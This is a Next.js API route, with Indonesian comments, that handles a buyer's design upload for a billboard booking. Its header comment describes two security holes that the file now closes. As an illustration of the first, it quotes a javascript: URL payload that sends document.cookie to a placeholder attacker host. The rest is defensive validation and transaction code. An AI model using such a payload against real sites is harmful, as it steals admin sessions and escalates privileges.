// src/app/api/booking/submit-design/route.ts
//
// Pembeli mengunggah berkas desainnya sendiri.
//
// DUA LUBANG YANG DITUTUP DI FILE INI
// -----------------------------------
// 1. `designUrl` dulu ditulis ke `designFileUrl` APA ADANYA — tanpa pemeriksaan
//    tipe, tanpa pemeriksaan skema. Kolom itu dirender sebagai `src` gambar dan
//    `href` tombol "Download Desain" di `OrderActions.tsx`, `BookingCard.tsx`,
//    dan `TransactionClient.tsx`. Pembeli bisa mengirim
//    `javascript:fetch('https://penyerang/?c='+document.cookie)` untuk
//    pesanannya sendiri; admin yang menekan tombolnya menjalankan skrip itu di
//    origin aplikasi dengan sesi admin. Kenaikan hak dari USER ke ADMIN, dipicu
//    satu klik yang tampak wajar. Pemeriksaannya sekarang satu tempat:
//    `src/lib/url-bukti.ts` — sama dengan yang dipakai bukti refund dan bukti
//    pemasangan di `admin/update-order`.
// 2. `updateMany` dulu hanya menyaring `{ id, userId }` — tanpa syarat status.
//    Pemiliknya bisa menarik pesanan yang sudah `IN_PRODUCTION`, `INSTALLATION`,
//    atau `ACTIVE` kembali ke `DESIGN_RECEIVED` kapan pun: billboard sudah
//    tercetak dan terpasang, tapi di dashboard admin pesanannya muncul lagi di
//    antrean "desain masuk" dengan berkas baru. Gerbangnya sekarang memakai
//    `transisiSah` yang sama dengan seluruh sistem, jadi tidak ada daftar status
//    kedua yang bisa menyimpang dari peta di `src/lib/transisi-status.ts`.

import { NextResponse } from "next/server";
import { getServerSession } from "next-auth";
import { authOptions } from "@/lib/auth";
import { prisma } from "@/lib/prisma";
import { BookingStatus } from "@/lib/enum-guard";
import { pesanTransisiDitolak, transisiSah } from "@/lib/transisi-status";
import { urlBuktiSah } from "@/lib/url-bukti";

export async function POST(req: Request) {
  try {
    const session = await getServerSession(authOptions);
    if (!session) return NextResponse.json({ message: "Login dulu" }, { status: 401 });

    let body: unknown;
    try {
      body = await req.json();
    } catch {
      return NextResponse.json({ message: "Body bukan JSON yang sah." }, { status: 400 });
    }

    const { orderId, designUrl } = (body ?? {}) as Record<string, unknown>;

    // `orderId` dulu diteruskan ke Prisma tanpa diperiksa tipenya. Nilai selain
    // teks membuat query gagal dengan galat yang jatuh ke "Gagal" — pesan yang
    // tidak memberi tahu pemakai apa pun.
    if (typeof orderId !== 'string' || orderId.trim() === "") {
      return NextResponse.json({ message: "ID pesanan tidak valid." }, { status: 400 });
    }

    const berkas = urlBuktiSah(designUrl);
    if (!berkas) {
      return NextResponse.json(
        {
          message:
            "URL desain tidak valid. Unggah berkasnya lewat tombol unggah, atau " +
            "tempelkan tautan http/https.",
        },
        { status: 400 }
      );
    }

    // Pembacaan status, pemeriksaan transisi, dan penulisan hidup dalam satu
    // transaksi. Status yang diperiksa harus status yang berlaku saat baris
    // ditulis, bukan status beberapa milidetik sebelumnya.
    const hasil = await prisma.$transaction(async (tx) => {
      // Kepemilikan ditegakkan di tingkat query: sebelumnya order diambil
      // berdasarkan id saja, sehingga user mana pun bisa menimpa desain milik
      // orang lain.
      const pesanan = await tx.booking.findFirst({
        where: { id: orderId, userId: session.user.id },
        select: { status: true },
      });

      if (!pesanan) return { keadaan: 'TIDAK_DITEMUKAN' } as const;

      // `transisiSah` mengembalikan true bila status tidak berubah, jadi
      // pengiriman ulang desain pada pesanan yang sudah `DESIGN_RECEIVED`
      // (mis. setelah admin menolak desain sebelumnya) tetap lolos.
      if (!transisiSah(pesanan.status, BookingStatus.DESIGN_RECEIVED)) {
        return {
          keadaan: 'TRANSISI_DITOLAK',
          pesan: pesanTransisiDitolak(pesanan.status, BookingStatus.DESIGN_RECEIVED),
        } as const;
      }

      // `status` ikut di `where` supaya dua kiriman bersamaan tidak sama-sama
      // lolos pemeriksaan di atas lalu menimpa satu sama lain. `updateMany`
      // dipakai karena `update()` hanya menerima kolom unik pada `where`.
      const { count } = await tx.booking.updateMany({
        where: { id: orderId, userId: session.user.id, status: pesanan.status },
        data: {
          designFileUrl: berkas,
          status: BookingStatus.DESIGN_RECEIVED,

          // `designStatus` dulu tidak diisi di sini — dibiarkan NULL. Satu-
          // satunya penulis kolom ini adalah admin (APPROVED/REJECTED), jadi
          // nilai PENDING_REVIEW tidak pernah benar-benar ada di database.
          // Tampilan "menunggu review" di dashboard pelanggan dan di panel
          // admin hanya selamat karena keduanya memakai penyangga
          // `|| 'PENDING_REVIEW'` untuk nilai kosong — artinya "belum kirim
          // desain" dan "sudah kirim, menunggu admin" terlihat sama persis.
          // Sekarang keadaannya tercatat sebagai fakta.
          designStatus: "PENDING_REVIEW",

          // Desain yang dikirim ulang setelah ditolak harus menghapus alasan
          // penolakan lama, kalau tidak pesan itu menempel selamanya.
          designRejectionReason: null,
        },
      });

      return count === 0 ? ({ keadaan: 'BERUBAH' } as const) : ({ keadaan: 'TERSIMPAN' } as const);
    });

    if (hasil.keadaan === 'TIDAK_DITEMUKAN') {
      return NextResponse.json({ message: "Pesanan tidak ditemukan" }, { status: 404 });
    }

    if (hasil.keadaan === 'TRANSISI_DITOLAK') {
      return NextResponse.json({ message: hasil.pesan }, { status: 409 });
    }

    if (hasil.keadaan === 'BERUBAH') {
      return NextResponse.json(
        { message: "Status pesanan sudah berubah. Muat ulang halaman lalu coba lagi." },
        { status: 409 }
      );
    }

    return NextResponse.json({ message: "Desain Berhasil Dikirim" });
  } catch {
    // Objek galat tidak dicatat mentah: galat Prisma membawa query beserta nilai
    // kolomnya, termasuk data pesanan pembeli.
    console.error('[submit-design] gagal menyimpan desain.');
    return NextResponse.json({ message: "Gagal" }, { status: 500 });
  }
}
